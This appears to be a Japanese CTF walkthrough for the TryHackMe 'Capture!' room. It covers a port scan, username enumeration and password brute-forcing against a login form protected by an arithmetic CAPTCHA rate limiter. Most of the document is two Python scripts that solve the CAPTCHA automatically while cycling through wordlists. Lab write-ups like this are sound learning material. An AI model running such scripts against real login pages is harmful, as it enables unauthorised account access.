# Capture! CTF

https://tryhackme.com/room/capture

```text
SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly.
```

レートリミッターが実装されているとのこと。

## 添付ファイル

パスワードとユーザーのリストファイルが入っていた。

```shell
$ wc -l ./passwords.txt                                         
1567 ./passwords.txt

$ wc -l ./usernames.txt 
877 ./usernames.txt
```

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.119.134

root@ip-10-10-67-251:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-16 00:36 GMT
Nmap scan report for 10.10.119.134
Host is up (0.00024s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:CB:A2:E7:D3:2D (Unknown)
```

## ログイン画面

ユーザー名の存在は判別できる仕様。

```text
Error: The user 'aaa' does not exist 
```

レートリミットで四則演算のフォームが追加される。
- 1項目は100以上、2項目は100以下の整数
- 演算子は +, -, * の三種類

```text
Too many bad login attempts!
Captcha enabled

636 + 80 = ? 
```

おそらく送信元IPアドレスでレートリミットを設定していると思われるので、hydraやffuf等を使うのは無理と判断してカスタムツールを作る。

### 有効ユーザー名特定

```python
import requests
import re
from bs4 import BeautifulSoup

SERVER_IP = "10.10.119.134"
LOGIN_URL = f"http://{SERVER_IP}/login"
USERNAMES_FILE = "usernames.txt"
PASSWORD1 = "bbb"
PASSWORD2 = "aaa"

# 数式をパースして解く関数
def solve_captcha(expression: str) -> int:
    match = re.match(r"(\d{3})\s*([+\-*])\s*(\d{1,3})", expression)
    if not match:
        raise ValueError("Unexpected CAPTCHA format")
    num1, operator, num2 = match.groups()
    num1, num2 = int(num1), int(num2)
    return eval(f"{num1} {operator} {num2}")

with open(USERNAMES_FILE, "r") as file:
    for line in file:
        username = line.strip()
        if not username:
            continue
        
        # 1st login attempt
        data = {"username": username, "password": PASSWORD1}
        response = requests.post(LOGIN_URL, data=data)
        soup = BeautifulSoup(response.text, "html.parser")
        
        if "Captcha enabled" in soup.text:
            # Extract the CAPTCHA question
            match = re.search(r"(\d{3} [*+\-] \d{1,3}) = \?", soup.text)
            if not match:
                continue
            captcha_result = solve_captcha(match.group(1))
            
            # 2nd login attempt with CAPTCHA
            data = {"username": username, "password": PASSWORD2, "captcha": captcha_result}
            response = requests.post(LOGIN_URL, data=data)
            soup = BeautifulSoup(response.text, "html.parser")
        
        if "does not exist" in soup.text:
            continue
        
        print(username)
```

有効なユーザー名が判明。

### パスワード特定

```python
import requests
import re
from bs4 import BeautifulSoup

SERVER_IP = "10.10.119.134"
LOGIN_URL = f"http://{SERVER_IP}/login"
PASSWORDS_FILE = "passwords.txt"
username = "*******"

# 数式をパースして解く関数
def solve_captcha(expression: str) -> int:
    match = re.match(r"(\d{3})\s*([+\-*])\s*(\d{1,3})", expression)
    if not match:
        raise ValueError("Unexpected CAPTCHA format")
    num1, operator, num2 = match.groups()
    num1, num2 = int(num1), int(num2)
    return eval(f"{num1} {operator} {num2}")

with open(PASSWORDS_FILE, "r") as file:
    for line in file:
        password = line.strip()
        if not password:
            continue
        
        # 1st login attempt
        data = {"username": username, "password": password}
        response = requests.post(LOGIN_URL, data=data)
        soup = BeautifulSoup(response.text, "html.parser")
        
        if "Captcha enabled" in soup.text:
            # Extract the CAPTCHA question
            match = re.search(r"(\d{3} [*+\-] \d{1,3}) = \?", soup.text)
            if not match:
                continue
            captcha_result = solve_captcha(match.group(1))
            
            # 2nd login attempt with CAPTCHA
            data = {"username": username, "password": password, "captcha": captcha_result}
            response = requests.post(LOGIN_URL, data=data)
            soup = BeautifulSoup(response.text, "html.parser")
        
        if "Invalid password" in soup.text:
            continue
        
        print(password)
```

何故か4個出てきたが、そのうち1つを使ってログインできた。

## 振り返り

- 既製ツールで解決した人がいないかと、他の人のウォークスルーをいくつか見たが、いずれも同じようにPythonでコードを書いていた。

